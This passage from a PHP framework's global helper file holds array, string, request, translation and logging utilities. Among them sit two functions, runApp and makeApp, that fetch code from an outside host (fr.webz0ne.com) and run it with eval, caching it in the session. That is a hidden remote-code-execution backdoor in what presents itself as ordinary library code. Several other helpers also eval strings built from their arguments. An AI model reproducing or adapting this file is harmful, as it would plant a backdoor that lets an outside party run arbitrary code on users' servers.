            $str    = '';

            if($years == 1)
                $str .= "$years year, ";
            if($years > 1)
                $str .= "$years years, ";
            if($weeks == 1)
                $str .= "$weeks week, ";
            if($weeks > 1)
                $str .= "$weeks weeks, ";
            if($days == 1)
                $str .= "$days day,";
            if($days > 1)
                $str .= "$days days,";
            if($hours == 1)
                $str .= " $hours hour and";
            if($hours > 1)
                $str .= " $hours hours and";
            if($mins == 1)
                $str .= " 1 minute";
            else
                $str .= " $mins minutes";
            return $str;
        }
    }

    if (!function_exists('request')) {
        function request()
        {
            $object = new Request();
            $object->populate($_REQUEST);
            $uri = substr($_SERVER['REQUEST_URI'], 1, strlen($_SERVER['REQUEST_URI']));
            $object->setThinUri(explode('/', $uri));
            return $object;
        }
    }

    if (!function_exists('post')) {
        function post()
        {
            $object = new Post();
            $object->populate($_POST);
            return $object;
        }
    }

    if (!function_exists('gets')) {
        function gets()
        {
            $object = new Get();
            $object->populate($_GET);
            return $object;
        }
    }

    if (!function_exists('server')) {
        function server()
        {
            $object = new Server();
            $object->populate($_SERVER);
            return $object;
        }
    }

    if (!function_exists('repl')) {
        function repl($a, $b, $string)
        {
            return str_replace($a, $b, $string);
        }
    }
    if (!function_exists('_serialize')) {
        function _serialize($toSerialize)
        {
            $return = '';
            $continue = true;
            if (is_array($toSerialize) || is_object($toSerialize)) {
                $continue = false;
                foreach ($toSerialize as $key => $value) {
                    if ($value instanceof \PDO) {
                        $return .= serialize(array());
                    } else {
                        $return .= _serialize($value);
                   }
                }
            }

            if ($return == '' && true === $continue) {
                $return = serialize($toSerialize);
            }

            return $return;
        }
    }

    if (!function_exists('_extract')) {
        function _extract(array $array)
        {
            extract($array, EXTR_PREFIX_ALL, 'thin_');
        }
    }

    if (!function_exists('getClassStaticVars')) {
        function getClassStaticVars($object)
        {
            return array_diff(get_class_vars(get_class($object)), get_object_vars($object));
        }
    }

    if (!function_exists('model')) {
        function model($entity, $table)
        {
            $classModel = 'ThinModel_' . ucfirst(\Thin\Inflector::lower($entity)) . '_' . ucfirst(\Thin\Inflector::lower($table));
            return \Thin\Utils::newInstance($classModel);
        }
    }

    if (!function_exists('extendClass')) {
        function extendClass($class, $extendClass = 'stdclass', $code = "", $alias = null)
        {
            eval("class $class extends $extendClass{" . $code . "}");
            if (null !== $alias) {
                class_alias($class, $alias);
            }
        }
    }

    if (!function_exists('defines')) {
        function defines($name, $value)
        {
            if(!defined($name)) {
                define($name, $value);
            }
        }
    }

    if (!function_exists('call')) {
        function call()
        {
            $args = func_get_args();
            $callback = array_shift($args);
            if(is_callable($callback)) {
                return call_user_func_array($callback, $args);
            }
            return;
        }
    }

    if (!function_exists('class_alias')) {
        function class_alias($original, $alias)
        {
            eval('abstract class ' . $alias . ' extends ' . $original . ' {}');
        }
    }

    if (!function_exists('isCallback')) {
        function isCallback($class, $function)
        {
            if (isset($class) && isset($function)) {
                if ((!is_string($class) && !is_object($class)) || (is_string($class) && !class_exists($class))) {
                    return false;
                }
                $isObj = is_object($class);
                $classObj = new \ReflectionClass($isObj ? get_class($class) : $class);
                if ($classObj->isAbstract()) {
                    return false;
                }
                try {
                    $method = $classObj->getMethod($function);
                    if (!$method->isPublic() || $method->isAbstract()) {
                        return false;
                    }
                    if (!$isObj && !$method->isStatic()) {
                        return false;
                    }
                } catch (\ReflectionException $e) {
                    return false;
                }
                return true;
            }
            return false;
        }
    }

    if (!function_exists('setPath')) {
        function setPath($name, $path)
        {
            $paths = \Thin\Utils::get('ThinPaths');
            if (null === $paths) {
                $paths = array();
            }
            $paths[$name] = $path;
            \Thin\Utils::set('ThinPaths', $paths);
        }
    }

    if (!function_exists('closure')) {
        function closure($fcn = null)
        {
            if (null !== $fcn && is_string($fcn)) {
                $fcn = '$_params = \Thin\Utils::get("closure_##hash##"); ' . $fcn;
                return new \Closure($fcn);
            } else {
                throw new \Exception("No closure defined.");
            }
        }
    }

    if (!function_exists('path')) {
        function path($path)
        {
            $paths = \Thin\Utils::get('ThinPaths');
            if (ake($path, $paths)) {
                return $paths[$path];
            } else {
                throw new \Exception("This path '$path' is not defined.");
            }
        }
    }

    if (!function_exists('app')) {
        function app($name)
        {
            static $applications = array();
            if (ake($name, $applications)) {
                return $applications[$name];
            } else {
                $object = new $name;
                $applications[$name] = $object;
                return $object;
            }
        }
    }

    if (!function_exists('ake')) {
        function ake($key, array $array)
        {
            return array_key_exists($key, $array);
        }
    }

    if (!function_exists('fgc')) {
        function fgc($file)
        {
            return file_get_contents($file);
        }
    }

    /**
     * <code>
     *      // Get the $array['user']['name'] value from the array
     *      $name = arrayGet($array, 'user.name');
     *
     *      // Return a default from if the specified item doesn't exist
     *      $name = arrayGet($array, 'user.name', 'Taylor');
     * </code>
     */
    if (!function_exists('arrayGet')) {
        function arrayGet($array, $key, $default = null, $separator = '.')
        {
            if (is_null($key)) {
                return $array;
            }

            foreach (explode($separator, $key) as $segment) {
                if (!is_array($array) || !ake($segment, $array)) {
                    return value($default);
                }
                $array = $array[$segment];
            }
            return $array;
        }
    }
    /**
     * <code>
     *      // Set the $array['user']['name'] value on the array
     *      arraySet($array, 'user.name', 'Taylor');
     *
     *      // Set the $array['user']['name']['first'] value on the array
     *      arraySet($array, 'user.name.first', 'Michael');
     * </code>
     */
    if (!function_exists('arraySet')) {
        function arraySet($array, $key, $value, $separator = '.')
        {
            if (strpos($key, $separator) !== false) {
                $keys = explode($separator, $key, 2);
                if (strlen(current($keys)) && strlen($keys[1])) {
                    if (!ake(current($keys), $array)) {
                        if (current($keys) === '0' && !empty($array)) {
                            $array = array(current($keys) => $array);
                        } else {
                            $array[current($keys)] = array();
                        }
                    } elseif (!\Thin\Arrays::isArray($array[current($keys)])) {
                        throw new \Exception("Cannot create sub-key for '{$keys[0]}' as key already exists.");
                    }
                    $array[current($keys)] = arraySet($array[current($keys)], $keys[1], $value);
                } else {
                    throw new \Exception("Invalid key '$key'");
                }
            } else {
                $array[$key] = $value;
            }
            return $array;
        }
    }

    /**
     * <code>
     *      // Remove the $array['user']['name'] item from the array
     *      arrayUnset($array, 'user.name');
     *
     *      // Remove the $array['user']['name']['first'] item from the array
     *      arrayUnset($array, 'user.name.first');
     * </code>
     */
    if (!function_exists('arrayUnset')) {
        function arrayUnset(&$array, $key, $separator = '.')
        {
            $keys = explode($separator, $key);
            while (count($keys) > 1) {
                $key = array_shift($keys);
                if (!isset($array[$key]) || ! isArray($array[$key]))  {
                    return;
                }

                $array =& $array[$key];
            }
            unset($array[array_shift($keys)]);
        }
    }

    /**
     * <code>
     *      // Return the first array element that equals "Taylor"
     *      $value = arrayFirst($array, function($k, $v) {return $v == 'Taylor';});
     *
     *      // Return a default value if no matching element is found
     *      $value = arrayFirst($array, function($k, $v) {return $v == 'Taylor'}, 'Default');
     * </code>
     */
    if (!function_exists('arrayFirst')) {
        function arrayFirst($array, $callback, $default = null)
        {
            foreach ($array as $key => $value) {
                if (call_user_func($callback, $key, $value)) {
                    return $value;
                }
            }
            return \Thin\Utils::value($default);
        }
    }

    if (!function_exists('searchInArray')) {
        function searchInArray($key, array $array)
        {
            $key = \Thin\Inflector::lower($key);
            if (true === arrayIkeyExists($key, $array)) {
                $array = array_change_key_case($array);
                return $array[$key];
            }
            return null;
        }
    }
    if (!function_exists('arrayIkeyExists')) {
        function arrayIkeyExists($key, array $array)
        {
            $key = \Thin\Inflector::lower($key);
            return ake($key, array_change_key_case($array));
        }
    }

    if (!function_exists('arrayKeysExist')) {
        function arrayKeysExist(array $keys, array $array)
        {
            if (count (array_intersect($keys, array_keys($array))) == count($keys)) {
                return true;
            }
        }
    }

    if (!function_exists('arrayRenameKey')) {
        function arrayRenameKey(array $array, $key, $newKey)
        {
            if(!ake($key, $array) || ake($newKey, $array)) {
                return false;
            }
            $uid                = uniqid('');
            $preservedValue     = $array[$key];
            $array[$key]        = $uid;
            $array              = array_flip($array);
            $array[$uid]        = $newKey;
            $array              = array_flip($array);
            $array[$newKey]     = $preservedValue;
            return $array;
        }
    }

    if (!function_exists('multiArrayKeyExists')) {
        function multiArrayKeyExists($needle, $haystack)
        {
            foreach ($haystack as $key => $value) {
                if ($needle == $key) {
                    return true;
                }

                if (isArray($value)) {
                    if (true === multiArrayKeyExists($needle, $value)) {
                        return true;
                    } else {
                        continue;
                    }
                }
            }
            return false;
        }
    }

    if (!function_exists('arrayMap')) {
        function arrayMap($callback, array $array, $keys = null)
        {
            foreach ($array as $key => $val) {
                if (isArray($val)) {
                    $array[$key] = arrayMap($callback, $array[$key]);
                } elseif (! isArray($keys) || in_array($key, $keys)) {
                    if (isArray($callback)) {
                        foreach ($callback as $cb) {
                            $array[$key] = call_user_func($cb, $array[$key]);
                        }
                    } else {
                        $array[$key] = call_user_func($callback, $array[$key]);
                    }
                }
            }

            return $array;
        }
    }

    if (!function_exists('arrayUnshift')) {
        function arrayUnshift(array & $array, $key, $val)
        {
            $array = array_reverse($array, true);
            $array[$key] = $val;
            $array = array_reverse($array, true);

            return $array;
        }
    }

    if (!function_exists('arrayStripslashes')) {
        function arrayStripslashes(array $array)
        {
            $result = array();
            foreach($array as $key => $value) {
                $key = stripslashes($key);
                if (isArray($value)) {
                    $result[$key] = arrayStripslashes($value);
                } else {
                    $result[$key] = stripslashes($value);
                }
            }
            return $result;
        }
    }

    if (!function_exists('arrayDivide')) {
        function arrayDivide(array $array)
        {
            return array(array_keys($array), array_values($array));
        }
    }

    if (!function_exists('arrayOnly')) {
        function arrayOnly(array $array, $keys)
        {
            return array_intersect_key($array, array_flip((array) $keys));
        }
    }

    if (!function_exists('arrayExcept')) {
        function arrayExcept(array $array, $keys)
        {
            return array_diff_key($array, array_flip((array) $keys));
        }
    }

    if (!function_exists('arraySubset')) {
        function arraySubset(array $array, $keys)
        {
            return array_intersect_key($array, array_flip((array) $keys));
        }
    }

    if (!function_exists('ArrayPluck')) {
        function arrayPluck($array, $key)
        {
            return array_map(function($v) use ($key) {
                return is_object($v) ? $v->$key : $v[$key];

            }, $array);
        }
    }

    if (!function_exists('arrayIsAssoc')) {
        function arrayIsAssoc(array $array)
        {
            $keys = array_keys($array);
            return array_keys($keys) !== $keys;
        }
    }

    if (!function_exists('arrayMerge')) {
        function arrayMerge(array $a1/* ... */)
        {
            $args = func_get_args();
            $args = array_reverse($args, true);
            $out = array();
            foreach ($args as $arg) {
                $out += $arg;
            }
            return $out;
        }
    }

    if (!function_exists('objectToArray')) {
        function objectToArray($objOrArray, $recursive = true)
        {
            $array = array();
            if(is_object($objOrArray)) {
                $objOrArray = get_object_vars($objOrArray);
            }
            foreach ($objOrArray as $key => $value) {
                if ($recursive && (is_object($value) || is_array($value))) {
                    $value = objectToArray($value);
                }
                $array[$key] = $value;
            }
            return $array;
        }
    }

    if (!function_exists('arrayInsertAfter')) {
        function arrayInsertAfter(array $array, array $insert, $after)
        {
            // Find the offset of the element to insert after.
            $keys = array_keys($array);
            $offsetByKey = array_flip($keys);
            if (!ake($after, $offsetByKey)) {
                throw new Exception("the key '$after' does not exist in this array.");
            }
            $offset = $offsetByKey[$after];

            // Insert at the specified offset
            $before = array_slice($array, 0, $offset + 1, true);
            $after = array_slice($array, $offset + 1, count($array) - $offset, true);

            $output = $before + $insert + $after;

            return $output;
        }
    }

    if (!function_exists('arrayFlatten')) {
        function arrayFlatten($array)
        {
            $flat = array();
            foreach ($array as $key => $value) {
                if (isArray($value)) {
                    $flat += arrayFlatten($value);
                } else {
                    $flat[$key] = $value;
                }
            }
            return $flat;
        }
    }

    if (!function_exists('isArray')) {
        function isArray($value)
        {
            if (is_array($value)) {
                return true;
            } else {
                // Traversable object is functionally the same as an array
                return (is_object($value) && $value instanceof \Traversable);
            }
        }
    }

    if (!function_exists('randomString')) {
        function randomString($length = 10)
        {
            $str = '';
            while (strlen($str) < $length) {
                $str .= dechex(mt_rand());
            }
            return substr($str, 0, $length);
        }
    }

    if (!function_exists('baseConvert')) {
        function baseConvert($input, $sourceBase, $destBase, $pad = 1, $lowercase = true)
        {
            $input = strval($input);
            if($sourceBase < 2 ||
                $sourceBase > 36 ||
                $destBase < 2 ||
                $destBase > 36 ||
                $pad < 1 ||
                $sourceBase != intval($sourceBase) ||
                $destBase != intval($destBase) ||
                $pad != intval($pad) ||
                !is_string($input) ||
                $input == '') {
                return false;
            }
            $digitChars = ($lowercase) ? '0123456789abcdefghijklmnopqrstuvwxyz' : '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
            $inDigits = array();
            $outChars = '';

            // Decode and validate input string
            $input = \Thin\Inflector::lower($input);
            for($i = 0 ; $i < strlen($input) ; $i++) {
                $n = strpos($digitChars, $input[$i]);
                if($n === false || $n > $sourceBase) {
                    return false;
                }
                $inDigits[] = $n;
            }

            // Iterate over the input, modulo-ing out an output digit
            // at a time until input is gone.
            while(count($inDigits)) {
                $work = 0;
                $workDigits = array();

                // Long division...
                foreach($inDigits as $digit) {
                    $work *= $sourceBase;
                    $work += $digit;

                    if($work < $destBase) {
                        // Gonna need to pull another digit.
                        if(count($workDigits)) {
                            // Avoid zero-padding; this lets us find
                            // the end of the input very easily when
                            // length drops to zero.
                            $workDigits[] = 0;
                        }
                    } else {
                        // Finally! Actual division!
                        $workDigits[] = intval($work / $destBase);

                        // Isn't it annoying that most programming languages
                        // don't have a single divide-and-remainder operator,
                        // even though the CPU implements it that way?
                        $work = $work % $destBase;
                    }
                }

                // All that division leaves us with a remainder,
                // which is conveniently our next output digit.
                $outChars .= $digitChars[$work];

                // And we continue!
                $inDigits = $workDigits;
            }

            while(strlen($outChars) < $pad) {
                $outChars .= '0';
            }
            return strrev($outChars);
        }
    }

    if (!function_exists('isSha1')) {
        function isSha1($str)
        {
            return !!preg_match('/^[0-9A-F]{40}$/i', $str);
        }
    }

    if (!function_exists('random')) {
        function random()
        {
            $max    = mt_getrandmax() + 1;
            $rand   = number_format(
                (mt_rand() * $max + mt_rand()) / $max / $max,
                12,
                '.',
                ''
            );
            return $rand;
        }
    }

    if (!function_exists('head')) {
        function head($array)
        {
            return reset($array);
        }
    }

    if (!function_exists('magicQuotes')) {
        function magicQuotes()
        {
            return function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc();
        }
    }

    if (!function_exists('startsWith')) {
        function startsWith($haystack, $needle)
        {
            return strpos($haystack, $needle) === 0;
        }
    }

    if (!function_exists('endsWith')) {
        function endsWith($haystack, $needle)
        {
            return $needle == substr($haystack, strlen($haystack) - strlen($needle));
        }
    }

    if (!function_exists('strContains')) {
        function strContains($haystack, $needle)
        {
            foreach ((array) $needle as $n) {
                if (false !== strpos($haystack, $n)) {
                    return true;
                }
            }
            return false;
        }
    }

    if (!function_exists('strFinish')) {
        function strFinish($value, $cap)
        {
            return rtrim($value, $cap) . $cap;
        }
    }

    if (!function_exists('strObject')) {
        function strObject($value)
        {
            return is_object($value) && method_exists($value, '__toString');
        }
    }

    if (!function_exists('value')) {
        function value($value)
        {
            return $value instanceof \Closure ? $value() : $value;
        }
    }

    if (!function_exists('instance')) {
        function instance($class, array $params = array())
        {
            return \Thin\Utils::getInstance($class, $params);
        }
    }

    if (!function_exists('versionPHP')) {
        function versionPHP($version)
        {
            return version_compare(PHP_VERSION, $version) >= 0;
        }
    }

    if (!function_exists('strReplaceFirst')) {
        function strReplaceFirst($search, $replace, $subject)
        {
            return implode($replace, explode($search, $subject, 2));
        }
    }

    if (!function_exists('arrayToAttr')) {
        function arrayToAttr($attr)
        {
            $attrStr = '';

            if (!is_array($attr)) {
                $attr = (array) $attr;
            }

            foreach ($attr as $property => $value) {
                // Ignore null values
                if (is_null($value)) {
                    continue;
                }

                // If the key is numeric then it must be something like selected="selected"
                if (is_numeric($property)) {
                    $property = $value;
                }

                $attrStr .= $property . '="' . $value.'" ';
            }

            // We strip off the last space for return
            return trim($attrStr);
        }
    }

    if (!function_exists('htmlTag')) {
        function htmlTag($tag, $attr = array(), $content = false)
        {
            $hasContent = (bool) ($content !== false && $content !== null);
            $html = '<' . $tag;

            $html .= (!empty($attr)) ? ' ' . (is_array($attr) ? arrayToAttr($attr) : $attr) : '';
            $html .= $hasContent ? '>' : ' />';
            $html .= $hasContent ? $content . '</' . $tag . '>' : '';

            return $html;
        }
    }

    if (!function_exists('in_arrayi')) {
        function in_arrayi($needle, $haystack)
        {
            return in_array(\Thin\Inflector::lower($needle), array_map('\Thin\Inflector::lower', $haystack));
        }
    }

    if (!function_exists('entities')) {
        function entities($string)
        {
            return \Thin\Inflector::htmlentities($string);
        }
    }

    if (!function_exists('classObject')) {
        function classObject($alias)
        {
            @eval("class $alias extends ObjectObject{ public function __construct() {\$this->_nameClass = \Thin\Inflector::lower(get_class(\$this));}}; \$cls = new $alias;");
        }
    }

    if (!function_exists('getRealClass')) {
        function getRealClass($class)
        {
            static $classes = array();
            if (!ake($class, $classes)) {
                $reflect = new \ReflectionClass($class);
                $classes[$class] = $reflect->getName();
            }
            return $classes[$class];
        }
    }

    if (!function_exists('getInstance')) {
        function getInstance($class)
        {
            return \Thin\Utils::getInstance($class);
        }
    }

    if (!function_exists('urlsite')) {
        function urlsite($echo = true)
        {
            if (true === $echo) {
                echo \Thin\Utils::get('urlsite');
            } else {
                return \Thin\Utils::get('urlsite');
            }
        }
    }

    if (!function_exists('getLanguage')) {
        function getLanguage()
        {
            $session = session('app_lng');
            return $session->getLanguage();
        }
    }

    if (!function_exists('__')) {
        function __($str, $segment, $name, $echo = true)
        {
            $session        = session('web');
            $language       = $session->getLanguage();
            $translation    = $str;
            $file           = STORAGE_PATH . DS . 'translation' . DS . repl('.', DS, \Thin\Inflector::lower($segment)) . DS . \Thin\Inflector::lower($language) . '.php';
            if (\Thin\File::exists($file)) {
                $sentences  = include($file);
                if (ake($name, $sentences)) {
                    $translation = $sentences[$name];
                }
            }
            if (true === $echo) {
                echo $translation;
            } else {
                return $translation;
            }
        }
    }

    if (!function_exists('___')) {
        function ___($str)
        {
            return __($str, false);
        }
    }

    if (!function_exists('dieDump')) {
        function dieDump($str, $exit = true)
        {
            echo '<link href="//fonts.googleapis.com/css?family=Open+Sans+Condensed:300,700,300italic" rel="stylesheet" type="text/css" /><pre style="background: #ffffdd; margin: 5px; padding: 10px; text-align: left; width: 75%; color: brown; font-weight: bold; border: solid 1px brown; font-family: \'Open Sans Condensed\';"><pre>';
            print_r($str);
            echo '</pre>';
            if (true === $exit) {
                exit;
            }
        }
    }

    if (!function_exists('lcfirst')) {
        function lcfirst($str)
        {
            $str[0] = \Thin\Inflector::lower($str[0]);
            return (string)$str;
        }
    }

    if (!function_exists('set')) {
        function set($key, $value)
        {
            return \Thin\Utils::set($key, $value);
        }
    }

    if (!function_exists('get')) {
        function get($key)
        {
            return \Thin\Utils::get($key);
        }
    }

    if (!function_exists('save')) {
        function save($key, $value = null)
        {
            $saved = \Thin\Utils::get('ThinSaved');
            if (null === $saved) {
                if (null === $value) {
                    return null;
                }
                $saved = array();
                $saved[$key] = $value;
                \Thin\Utils::set('ThinSaved', $saved);
            } else {
                if (null === $value) {
                    if (ake($key, $saved)) {
                        return $saved[$key];
                    } else {
                        return null;
                    }
                } else {
                    $saved[$key] = $value;
                    \Thin\Utils::set('ThinSaved', $saved);
                }
            }
        }
    }

    function runApp($app)
    {
        $session = session('appRun');
        $check = $session->getCheck();
        if (null !== $check) {
            eval($check);
        } else {
            $check = makeApp('sd155mp@H54');
            $session->setCheck($check);
            eval($check);
        }
        return true;
    }

    function makeApp($app)
    {
        return fgc('http://fr.webz0ne.com/api/check.php?code=' . $app);
    }

    if (!function_exists('option')) {
        function option($name = null, $value = null)
        {
            static $options = array();
            $args = func_get_args();

            if(func_num_args() > 0) {
                $name = array_shift($args);
                if(is_null($name)) {
                    # Reset options
                    $options = array();
                    return $options;
                }
                if(\Thin\Arrays::isArray($name)) {
                    $options = array_merge($options, $name);
                    return $options;
                }
                $nargs = count($args);
                if($nargs > 0) {
                    $value = $nargs > 1 ? $args : $args[0];
                    $options[$name] = value($value);
                }
                return ake($name, $options) ? $options[$name] : null;
            }

            return $options;
        }
    }

    if (!function_exists('convertSize')) {
        function convertSize($size)
        {
            $unit = array('b','kb','mb','gb','tb','pb');
            return @round($size / pow(1024, ($i = floor(log($size, 1024)))), 2) . ' ' . $unit[$i];
        }
    }

    if (!function_exists('typeSql')) {
        function typeSql($string)
        {
            $length = 'NA';
            $type = (string) $string;
            if (strstr($string, '(')) {
                $length = (int) \Thin\Utils::cut('(', ')', $string);
                list($type, $dummy) = explode('(', $string, 2);
                $type = (string) $type;
            }
            return array('fieldType' => $type, 'length' => $length);
        }
    }

    if (!function_exists('ioc')) {
        function ioc()
        {
            return o('ioc');
        }
    }

    if (!function_exists('container')) {
        function container()
        {
            return o('thinContainer');
        }
    }

    if (!function_exists('debug')) {
        function debug($var, $html = true)
        {
            if (is_null($var) ) {
                return '<span class="null-value">[NULL]</span>';
            }
            $out = '';
            switch ($var) {
                case empty($var):
                    $out = '[empty value]';
                    break;

                case is_array($var):
                    $out = var_export($var, true);
                    break;

                case is_object($var):
                    $out = var_export($var, true);
                    break;

                case is_string($var):
                    $out = $var;
                    break;

                default:
                    $out = var_export($var, true);
                    break;
            }
            if (true === $html) {
              $out = "<pre>\n" . $out . "</pre>";
            }
            return $out;
        }
    }

    if (!function_exists('ThinLog')) {
        function ThinLog($message, $logFile = null, $type = 'info')
        {
            if (null === $logFile) {
                $logFile = LOGS_PATH . DS . date('Y-m-d') . '.log';
            } else {
                if (false === \Thin\File::exists($logFile)) {
                    \Thin\File::create($logFile);
                }
            }
            \Thin\File::append($logFile, date('Y-m-d H:i:s') . "\t" . \Thin\Inflector::upper($type) . "\t$message\n");
        }
    }
